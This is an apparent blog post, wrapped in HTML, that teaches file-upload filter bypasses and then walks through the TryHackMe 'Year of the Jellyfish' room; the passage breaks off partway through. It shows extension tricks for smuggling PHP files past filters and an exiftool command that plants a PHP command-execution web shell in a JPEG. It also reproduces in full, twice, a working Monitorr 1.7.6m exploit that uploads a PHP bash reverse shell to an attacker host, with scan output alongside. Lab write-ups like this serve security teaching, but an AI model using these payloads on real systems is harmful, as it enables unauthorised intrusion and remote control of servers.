@@ -1,0 +1,589 @@
+<!DOCTYPE html>
+<html lang="en-us">
+
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<meta http-equiv="X-UA-Compatible" content="ie=edge">
+	<meta name="theme-color" content="#494f5c">
+	<meta name="msapplication-TileColor" content="#494f5c">
+<meta itemprop="name" content="Bypassing Upload Filters">
+<meta itemprop="description" content="One of the challenging factors to a Hacker in a web application attack is the file upload. The first step in every attack is to get some code and inject it to the system to be attacked. The attack needs to find an uncomplicated and flawless path to get the code executed. Using a file upload attacker achieves his first step.
+Examples Attacks on application platforms  Upload .jsp file into web tree - jsp code executed as the web user Upload ."><meta itemprop="datePublished" content="2021-05-20T12:05:40&#43;05:30" />
+<meta itemprop="dateModified" content="2021-05-20T12:05:40&#43;05:30" />
+<meta itemprop="wordCount" content="2826">
+<meta itemprop="keywords" content="Bypassing,Upload,Data,THM,Writeup,Year-of-the-Jellyfish,RiteshPuvvada," /><meta property="og:title" content="Bypassing Upload Filters" />
+<meta property="og:description" content="One of the challenging factors to a Hacker in a web application attack is the file upload. The first step in every attack is to get some code and inject it to the system to be attacked. The attack needs to find an uncomplicated and flawless path to get the code executed. Using a file upload attacker achieves his first step.
+Examples Attacks on application platforms  Upload .jsp file into web tree - jsp code executed as the web user Upload ." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://riteshpuvvada.github.io/posts/bypassing_upload_filters/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2021-05-20T12:05:40&#43;05:30" />
+<meta property="article:modified_time" content="2021-05-20T12:05:40&#43;05:30" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Bypassing Upload Filters"/>
+<meta name="twitter:description" content="One of the challenging factors to a Hacker in a web application attack is the file upload. The first step in every attack is to get some code and inject it to the system to be attacked. The attack needs to find an uncomplicated and flawless path to get the code executed. Using a file upload attacker achieves his first step.
+Examples Attacks on application platforms  Upload .jsp file into web tree - jsp code executed as the web user Upload ."/>
+
+	<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+	<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+	<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+	<link rel="manifest" href="/site.webmanifest">
+	<link rel="mask-icon" href="/safari-pinned-tab.svg" color="">
+	<link rel="shortcut icon" href="/favicon.ico">
+
+	<title>Bypassing Upload Filters</title>
+	<link rel="stylesheet" href="https://riteshpuvvada.github.io/css/style.min.eac77496566fd7d5768fd650ddb0b2b181ca6a2d7c5fdd6fe6b8ba4bf47e566f.css" integrity="sha256-6sd0llZv19V2j9ZQ3bCysYHKai18X91v5ri6S/R+Vm8=" crossorigin="anonymous">
+	
+</head>
+
+<body id="page">
+	
+	<header id="site-header" class="animated slideInUp">
+		<div class="hdr-wrapper section-inner">
+			<div class="hdr-left">
+				<div class="site-branding">
+					<a href="https://riteshpuvvada.github.io/">Nightmare</a>
+				</div>
+				<nav class="site-nav hide-in-mobile">
+					
+				<a href="https://riteshpuvvada.github.io/about">About</a>
+				<a href="https://riteshpuvvada.github.io/posts">Blog</a>
+				<a href="https://riteshpuvvada.github.io/contact">Contact</a>
+
+				</nav>
+			</div>
+			<div class="hdr-right hdr-icons">
+				<span class="hdr-social hide-in-mobile"><a href="https://www.linkedin.com/in/ritesh-puvvada-656489196/" target="_blank" rel="noopener me" title="Linkedin"><svg xmlns="http://www.w3.org/2000/svg" class="feather" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path><rect x="2" y="9" width="4" height="12"></rect><circle cx="4" cy="4" r="2"></circle></svg></a><a href="https://www.instagram.com/riteshpuvvada/" target="_blank" rel="noopener me" title="Instagram"><svg xmlns="http://www.w3.org/2000/svg" class="feather" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="2" width="20" height="20" rx="5" ry="5"></rect><path d="M16 11.37A4 4 0 1 1 12.63 8 4 4 0 0 1 16 11.37z"></path><line x1="17.5" y1="6.5" x2="17.5" y2="6.5"></line></svg></a><a href="https://github.com/RiteshPuvvada" target="_blank" rel="noopener me" title="Github"><svg xmlns="http://www.w3.org/2000/svg" class="feather" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path></svg></a><a href="mailto:riteshpuvvada@outlook.com" target="_blank" rel="noopener me" title="Email"><svg xmlns="http://www.w3.org/2000/svg" class="feather" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path><polyline points="22,6 12,13 2,6"></polyline></svg></a><a href="https://stackoverflow.com/users/14728649/ritesh" target="_blank" rel="noopener me" title="Stackoverflow"><svg xmlns="http://www.w3.org/2000/svg" class="feather" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M2.913 16.041v6.848h17.599v-6.848M7.16 18.696h8.925M7.65 13.937l8.675 1.8M9.214 9.124l8.058 3.758M12.086 4.65l6.849 5.66M15.774 1.111l5.313 7.162"/></svg></a></span><button id="menu-btn" class="hdr-btn" title="Menu"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-menu"><line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="18" x2="21" y2="18"></line></svg></button>
+			</div>
+		</div>
+	</header>
+	<div id="mobile-menu" class="animated fast">
+		<ul>
+			<li><a href="https://riteshpuvvada.github.io/about">About</a></li>
+			<li><a href="https://riteshpuvvada.github.io/posts">Blog</a></li>
+			<li><a href="https://riteshpuvvada.github.io/contact">Contact</a></li>
+		</ul>
+	</div>
+
+
+	<main class="site-main section-inner animated fadeIn faster">
+		<article class="thin">
+			<header class="post-header">
+				<div class="post-meta"><span>May 20, 2021</span></div>
+				<h1>Bypassing Upload Filters</h1>
+			</header>
+			<div class="content">
+				<p>One of the challenging factors to a <strong>Hacker</strong> in a web application attack is the file upload. The first step in every attack is to get some code and inject it to the system to be attacked. The attack needs to find an uncomplicated and flawless path to get the code executed. Using a file upload attacker achieves his first step.</p>
+<p><img src="/img/blog/backdoor.png" alt="img"></p>
+<h3 id="examples">Examples<a href="#examples" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h3>
+<h4 id="attacks-on-application-platforms">Attacks on application platforms<a href="#attacks-on-application-platforms" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h4>
+<ul>
+<li>Upload <code>.jsp</code> file into web tree - jsp code executed as the web user</li>
+<li>Upload <code>.gif </code>file to be resized - image library flaw exploited</li>
+<li>Upload huge files - file space denial of service</li>
+<li>Upload file using malicious path or name - overwrite a critical file</li>
+<li>Upload file containing personal data - other users access it</li>
+<li>Upload file containing &ldquo;tags&rdquo; - tags get executed as part of being &ldquo;included&rdquo; in a web page</li>
+<li>Upload <code>.rar</code> file to be scanned by antivirus - command executed on a server running the vulnerable antivirus software</li>
+</ul>
+<h4 id="attacks-on-other-systems">Attacks on other systems<a href="#attacks-on-other-systems" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h4>
+<ul>
+<li>Upload <code>.exe</code> file into web tree - victims download trojaned executable</li>
+<li>Upload virus infected file - victims machines infected</li>
+<li>Upload <code>.html</code> file containing script - victim experiences Cross-site Scripting (XSS)</li>
+<li>Upload <code>.jpg</code> file containing a Flash object - victim experiences Cross-site Content Hijacking.</li>
+<li>Upload <code>.rar</code> file to be scanned by antivirus - command executed on a client running the vulnerable antivirus software</li>
+</ul>
+<h3 id="bypassing-blacklists">Bypassing Blacklists<a href="#bypassing-blacklists" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h3>
+<p>Blacklisting is a type of protection where specific extensions, are prohibited from being sent to the server. Blacklisting might be an effective solution yet this can be bypassed.</p>
+<p>In addition to regular extensions, there are many alternative extensions that can bypass blacklist filters.</p>
+<pre><code>.pht, .phtml, .php3, .php4, .php5, .php6, .inc, .jspx, .jspf, .jsw, .jsv, .pHp, .Php, .phP
+</code></pre><h3 id="bypassing-whitelists">Bypassing Whitelists<a href="#bypassing-whitelists" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h3>
+<p>Whitelisting is opposite of the blacklisting, here the server accepts only specific extension. For example a web application that allows you to upload a profile picture might only take <code>.JPEG</code>, <code>.JPG</code> or <code>.PNG</code> but it can still be bypassed.</p>
+<pre><code>shell.php.jpg, shell.php%00.jpg, shell.php\x00.jpg
+</code></pre><h3 id="exif-data">Exif data<a href="#exif-data" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h3>
+<p>EXIF is short for Exchangeable Image File, a format that is a standard for storing interchange information in digital photography image files using JPEG compression. Almost all new digital cameras use the EXIF annotation, storing information on the image such as shutter speed, exposure compensation, F number, what metering system was used, if a flash was used, ISO number, date and time the image was taken, whitebalance, auxiliary lenses that were used and resolution. Some images may even store GPS information so you can easily see where the images were taken!</p>
+<p>We can bypass file upload restrictions utilizes Exif data in an image. We can insert a comment that contains valid PHP code that will be executed by the server when the image is processed.</p>
+<p>We can use ExifTool to do this if it is not installed, install it with the package manager.</p>
+<pre><code>root@kali:~# apt install exiftool
+</code></pre><h4 id="exapmle">Exapmle<a href="#exapmle" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h4>
+<pre><code>root@kali:~/Desktop/tryhackme/advent# exiftool -Comment=&quot;&lt;?php system($_GET['cmd']); ?&gt;&quot; TryHackMe.jpg
+    1 image files updated
+    
+root@kali:~/Desktop/tryhackme/advent# file TryHackMe.jpg
+TryHackMe.jpg: JPEG image data, JFIF standard 1.01, resolution (DPI), density 72x72, segment length 16, comment: &quot;&lt;?php system(['cmd']); ?&gt;&quot;, baseline, precision 8, 320x320, components 3
+
+root@kali:~/Desktop/tryhackme/advent# mv TryHackMe.jpg TryHackMe.php.jpg
+
+root@kali:~/Desktop/tryhackme/advent# file TryHackMe.php.jpg 
+TryHackMe.php.jpg: JPEG image data, JFIF standard 1.01, resolution (DPI), density 72x72, segment length 16, comment: &quot;&lt;?php system(['cmd']); ?&gt;&quot;, baseline, precision 8, 320x320, components 3
+</code></pre><p>Resources<a href="https://null-byte.wonderhowto.com/how-to/bypass-file-upload-restrictions-web-apps-get-shell-0323454/">🤓</a>
+<a href="https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload">🤑</a></p>
+<blockquote>
+<p>Get hands on experience with TryHackMe</p>
+</blockquote>
+<p>link to the room <a href="https://tryhackme.com/room/yearofthejellyfish">👾</a></p>
+<h1 id="year-of-the-jellyfish--a-walkthrough">Year of the Jellyfish : A Walkthrough<a href="#year-of-the-jellyfish--a-walkthrough" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h1>
+<p>The detailed write-up of the TryHackMe room <strong>Year of the Jellyfish</strong></p>
+<h3 id="basic-nmap-scan">Basic Nmap scan<a href="#basic-nmap-scan" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h3>
+<pre><code>root@kali:~/Desktop/tryhackme/YOJ# nmap -v -sC -sV 54.216.18.239
+Starting Nmap 7.80 ( https://nmap.org ) at 2021-05-21 11:38 IST
+NSE: Loaded 151 scripts for scanning.
+NSE: Script Pre-scanning.
+Initiating NSE at 11:38
+Completed NSE at 11:38, 0.00s elapsed
+Initiating NSE at 11:38
+Completed NSE at 11:38, 0.00s elapsed
+Initiating NSE at 11:38
+Completed NSE at 11:38, 0.00s elapsed
+Initiating Ping Scan at 11:38
+Scanning 54.216.18.239 [4 ports]
+Completed Ping Scan at 11:38, 0.05s elapsed (1 total hosts)
+Initiating Parallel DNS resolution of 1 host. at 11:38
+Completed Parallel DNS resolution of 1 host. at 11:38, 0.09s elapsed
+Initiating SYN Stealth Scan at 11:38
+Scanning ec2-54-216-18-239.eu-west-1.compute.amazonaws.com (54.216.18.239) [1000 ports]
+Discovered open port 443/tcp on 54.216.18.239
+Discovered open port 22/tcp on 54.216.18.239
+Discovered open port 21/tcp on 54.216.18.239
+Discovered open port 80/tcp on 54.216.18.239
+Completed SYN Stealth Scan at 11:39, 23.42s elapsed (1000 total ports)
+Initiating Service scan at 11:39
+Scanning 4 services on ec2-54-216-18-239.eu-west-1.compute.amazonaws.com (54.216.18.239)
+Completed Service scan at 11:39, 17.15s elapsed (4 services on 1 host)
+NSE: Script scanning 54.216.18.239.
+Initiating NSE at 11:39
+Completed NSE at 11:39, 13.95s elapsed
+Initiating NSE at 11:39
+Completed NSE at 11:39, 7.51s elapsed
+Initiating NSE at 11:39
+Completed NSE at 11:39, 0.01s elapsed
+Nmap scan report for ec2-54-216-18-239.eu-west-1.compute.amazonaws.com (54.216.18.239)
+Host is up (0.021s latency).
+Not shown: 996 filtered ports
+PORT    STATE SERVICE  VERSION
+21/tcp  open  ftp      vsftpd 3.0.3
+22/tcp  open  ssh      OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|_  2048 46:b2:81:be:e0:bc:a7:86:39:39:82:5b:bf:e5:65:58 (RSA)
+80/tcp  open  http     Apache httpd 2.4.29
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Did not follow redirect to https://robyns-petshop.thm/
+443/tcp open  ssl/http Apache httpd 2.4.29 ((Ubuntu))
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: 400 Bad Request
+| ssl-cert: Subject: commonName=robyns-petshop.thm/organizationName=Robyns Petshop/stateOrProvinceName=South West/countryName=GB
+| Subject Alternative Name: DNS:robyns-petshop.thm, DNS:monitorr.robyns-petshop.thm, DNS:beta.robyns-petshop.thm, DNS:dev.robyns-petshop.thm
+| Issuer: commonName=robyns-petshop.thm/organizationName=Robyns Petshop/stateOrProvinceName=South West/countryName=GB
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2021-05-21T06:07:38
+| Not valid after:  2022-05-21T06:07:38
+| MD5:   e8e5 3398 f020 aae3 d1fc 0cee 1bd9 cbfb
+|_SHA-1: 8360 f5ab 88c3 16c9 8b95 be37 8577 b874 067c a217
+|_ssl-date: TLS randomness does not represent time
+| tls-alpn: 
+|_  http/1.1
+Service Info: Host: robyns-petshop.thm; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+NSE: Script Post-scanning.
+Initiating NSE at 11:39
+Completed NSE at 11:39, 0.00s elapsed
+Initiating NSE at 11:39
+Completed NSE at 11:39, 0.00s elapsed
+Initiating NSE at 11:39
+Completed NSE at 11:39, 0.00s elapsed
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 63.04 seconds
+           Raw packets sent: 3012 (132.448KB) | Rcvd: 21 (864B)
+
+</code></pre><blockquote>
+<p>When I tried to open <code>54.216.18.239</code> on port 80 it just automatically redirected to <code>https://robyns-petshop.thm/</code> but got Network error. From the above Nmap scan we can view the alternative names <code>| Subject Alternative Name: DNS:robyns-petshop.thm, DNS:monitorr.robyns-petshop.thm, DNS:beta.robyns-petshop.thm, DNS:dev.robyns-petshop.thm</code>, so I modified my hosts file.</p>
+</blockquote>
+<pre><code>DNS:robyns-petshop.thm
+DNS Name: monitorr.robyns-petshop.thm
+DNS Name: beta.robyns-petshop.thm
+DNS Name: dev.robyns-petshop.thm
+</code></pre><pre><code>root@kali:~# nano /etc/hosts
+127.0.0.1       localhost
+10.0.2.5        kali
+54.216.18.239   robyns-petshop.thm monitorr.robyns-petshop.thm beta.robyns-petshop.thm dev.robyns-petshop.thm                                                           
+# The following lines are desirable for IPv6 capable hosts
+::1     localhost ip6-localhost ip6-loopback
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+10.10.148.116 spookysec.local
+</code></pre><blockquote>
+<p>Hurray! we are in</p>
+</blockquote>
+<p><img src="/img/blog/YOJ1.PNG" alt="img"></p>
+<blockquote>
+<p>It&rsquo;s a normal webpage and doesn&rsquo;t consist of any dynamic content, so I opened <code>monitorr.robyns-petshop.thm</code>.</p>
+</blockquote>
+<p>You can check more about Monitorr <a href="https://github.com/Monitorr/Monitorr">Here</a></p>
+<blockquote>
+<p>After spending some time on it I found <strong>Monitorr 1.7.6m</strong> is vulnerable for Authorization Bypass and Remote code Execution (RCE). For more info you can view this <a href="https://lyhinslab.org/index.php/2020/09/12/how-the-white-box-hacking-works-authorization-bypass-and-remote-code-execution-in-monitorr-1-7-6/">Detailed Bug Description</a>.</p>
+</blockquote>
+<p>When I searched <strong>Monitorr 1.7.6m</strong> on exploit-db, It showed me two exploits :</p>
+<ul>
+<li><a href="https://www.exploit-db.com/exploits/48981">Authorization Bypass</a></li>
+<li><a href="https://www.exploit-db.com/exploits/48980">Remote Code Execution (Unauthenticated)</a></li>
+</ul>
+<p>If you find any login page for the target website, go ahead and download the <strong>Authorization Bypass</strong>.</p>
+<p>Otherwise download the <strong>Remote Code Execution (Unauthenticated)</strong>.</p>
+<p>Here is the code</p>
+<pre><code>#!/usr/bin/python
+# -*- coding: UTF-8 -*-
+
+# Exploit Title: Monitorr 1.7.6m - Remote Code Execution (Unauthenticated)
+# Date: September 12, 2020
+# Exploit Author: Lyhin's Lab
+# Detailed Bug Description: https://lyhinslab.org/index.php/2020/09/12/how-the-white-box-hacking-works-authorization-bypass-and-remote-code-execution-in-monitorr-1-7-6/
+# Software Link: https://github.com/Monitorr/Monitorr
+# Version: 1.7.6m
+# Tested on: Ubuntu 19
+
+import requests
+import os
+import sys
+
+if len (sys.argv) != 4:
+	print (&quot;specify params in format: python &quot; + sys.argv[0] + &quot; target_url lhost lport&quot;)
+else:
+    url = sys.argv[1] + &quot;/assets/php/upload.php&quot;
+    headers = {&quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0&quot;, &quot;Accept&quot;: &quot;text/plain, */*; q=0.01&quot;, &quot;Accept-Language&quot;: &quot;en-US,en;q=0.5&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;X-Requested-With&quot;: &quot;XMLHttpRequest&quot;, &quot;Content-Type&quot;: &quot;multipart/form-data; boundary=---------------------------31046105003900160576454225745&quot;, &quot;Origin&quot;: sys.argv[1], &quot;Connection&quot;: &quot;close&quot;, &quot;Referer&quot;: sys.argv[1]}
+
+    data = &quot;-----------------------------31046105003900160576454225745\r\nContent-Disposition: form-data; name=\&quot;fileToUpload\&quot;; filename=\&quot;she_ll.php\&quot;\r\nContent-Type: image/gif\r\n\r\nGIF89a213213123&lt;?php shell_exec(\&quot;/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/&quot;+sys.argv[2] +&quot;/&quot; + sys.argv[3] + &quot; 0&gt;&amp;1'\&quot;);\r\n\r\n-----------------------------31046105003900160576454225745--\r\n&quot;
+
+    requests.post(url, headers=headers, data=data)
+
+    print (&quot;A shell script should be uploaded. Now we try to execute it&quot;)
+    url = sys.argv[1] + &quot;/assets/data/usrimg/she_ll.php&quot;
+    headers = {&quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&quot;, &quot;Accept-Language&quot;: &quot;en-US,en;q=0.5&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Connection&quot;: &quot;close&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;}
+    requests.get(url, headers=headers)
+</code></pre><p>From the code <code>url = sys.argv[1] + &quot;/assets/php/upload.php&quot;</code>, we get the path where the image gets uploaded.</p>
+<pre><code>ERROR: is not an image or exceeds the webserver’s upload size limit.
+ERROR: ../data/usrimg/ already exists.
+ERROR: was not uploaded.
+</code></pre><p>So, the path is <code>/assets/data/usrimg</code></p>
+<p>Usage</p>
+<pre><code>root@kali:~/Desktop/tryhackme/YOJ# python3 48980.py 
+specify params in format: python 48980.py target_url lhost lport
+</code></pre><p><code>url =&gt; https://monitorr.robyns-petshop.thm/ </code>
+<code>lhost =&gt; THM VPN IP</code>
+<code>lport =&gt; 443</code></p>
+<pre><code>root@kali:~/Desktop/tryhackme/YOJ# python3 48980.py https://monitorr.robyns-petshop.thm/ 10.6.29.240 443
+Traceback (most recent call last):
+  File &quot;/usr/local/lib/python3.9/site-packages/urllib3/connectionpool.py&quot;, line 670, in urlopen
+    httplib_response = self._make_request(
+  File &quot;/usr/local/lib/python3.9/site-packages/urllib3/connectionpool.py&quot;, line 381, in _make_request
+    self._validate_conn(conn)
+  File &quot;/usr/local/lib/python3.9/site-packages/urllib3/connectionpool.py&quot;, line 976, in _validate_conn
+    conn.connect()
+  File &quot;/usr/local/lib/python3.9/site-packages/urllib3/connection.py&quot;, line 361, in connect
+    self.sock = ssl_wrap_socket(
+  File &quot;/usr/local/lib/python3.9/site-packages/urllib3/util/ssl_.py&quot;, line 377, in ssl_wrap_socket
+    return context.wrap_socket(sock, server_hostname=server_hostname)
+  File &quot;/usr/local/lib/python3.9/ssl.py&quot;, line 500, in wrap_socket
+    return self.sslsocket_class._create(
+  File &quot;/usr/local/lib/python3.9/ssl.py&quot;, line 1040, in _create
+    self.do_handshake()
+  File &quot;/usr/local/lib/python3.9/ssl.py&quot;, line 1309, in do_handshake
+    self._sslobj.do_handshake()
+ssl.SSLCertVerificationError: [SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: unable to get local issuer certificate (_ssl.c:1123)
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File &quot;/usr/local/lib/python3.9/site-packages/requests/adapters.py&quot;, line 439, in send
+    resp = conn.urlopen(
+  File &quot;/usr/local/lib/python3.9/site-packages/urllib3/connectionpool.py&quot;, line 724, in urlopen
+    retries = retries.increment(
+  File &quot;/usr/local/lib/python3.9/site-packages/urllib3/util/retry.py&quot;, line 439, in increment
+    raise MaxRetryError(_pool, url, error or ResponseError(cause))
+urllib3.exceptions.MaxRetryError: HTTPSConnectionPool(host='monitorr.robyns-petshop.thm', port=443): Max retries exceeded with url: //assets/php/upload.php (Caused by SSLError(SSLCertVerificationError(1, '[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: unable to get local issuer certificate (_ssl.c:1123)')))
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File &quot;/root/Desktop/tryhackme/YOJ/48980.py&quot;, line 24, in &lt;module&gt;
+    requests.post(url, headers=headers, data=data)
+  File &quot;/usr/local/lib/python3.9/site-packages/requests/api.py&quot;, line 119, in post
+    return request('post', url, data=data, json=json, **kwargs)
+  File &quot;/usr/local/lib/python3.9/site-packages/requests/api.py&quot;, line 61, in request
+    return session.request(method=method, url=url, **kwargs)
+  File &quot;/usr/local/lib/python3.9/site-packages/requests/sessions.py&quot;, line 530, in request
+    resp = self.send(prep, **send_kwargs)
+  File &quot;/usr/local/lib/python3.9/site-packages/requests/sessions.py&quot;, line 643, in send
+    r = adapter.send(request, **kwargs)
+  File &quot;/usr/local/lib/python3.9/site-packages/requests/adapters.py&quot;, line 514, in send
+    raise SSLError(e, request=request)
+requests.exceptions.SSLError: HTTPSConnectionPool(host='monitorr.robyns-petshop.thm', port=443): Max retries exceeded with url: //assets/php/upload.php (Caused by SSLError(SSLCertVerificationError(1, '[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: unable to get local issuer certificate (_ssl.c:1123)')))
+
+</code></pre><blockquote>
+<p>Hmm! The exploit didn&rsquo;t worked.</p>
+</blockquote>
+<p>Let&rsquo;s print the response</p>
+<pre><code>r = requests.post(url, headers=headers, data=data)
+print(r.text)
+</code></pre><p>Modified exploit :</p>
+<pre><code>import requests
+import os
+import sys
+
+if len (sys.argv) != 4:
+	print (&quot;specify params in format: python &quot; + sys.argv[0] + &quot; target_url lhost lport&quot;)
+else:
+    url = sys.argv[1] + &quot;/assets/php/upload.php&quot;
+    headers = {&quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0&quot;, &quot;Accept&quot;: &quot;text/plain, */*; q=0.01&quot;, &quot;Accept-Language&quot;: &quot;en-US,en;q=0.5&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;X-Requested-With&quot;: &quot;XMLHttpRequest&quot;, &quot;Content-Type&quot;: &quot;multipart/form-data; boundary=---------------------------31046105003900160576454225745&quot;, &quot;Origin&quot;: sys.argv[1], &quot;Connection&quot;: &quot;close&quot;, &quot;Referer&quot;: sys.argv[1]}
+
+    data = &quot;-----------------------------31046105003900160576454225745\r\nContent-Disposition: form-data; name=\&quot;fileToUpload\&quot;; filename=\&quot;she_ll.php\&quot;\r\nContent-Type: image/gif\r\n\r\nGIF89a213213123&lt;?php shell_exec(\&quot;/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/&quot;+sys.argv[2] +&quot;/&quot; + sys.argv[3] + &quot; 0&gt;&amp;1'\&quot;);\r\n\r\n-----------------------------31046105003900160576454225745--\r\n&quot;
+
+    r = requests.post(url, headers=headers, data=data, verify = False) # Modified
+    print(r.text) # Printing the response 
+
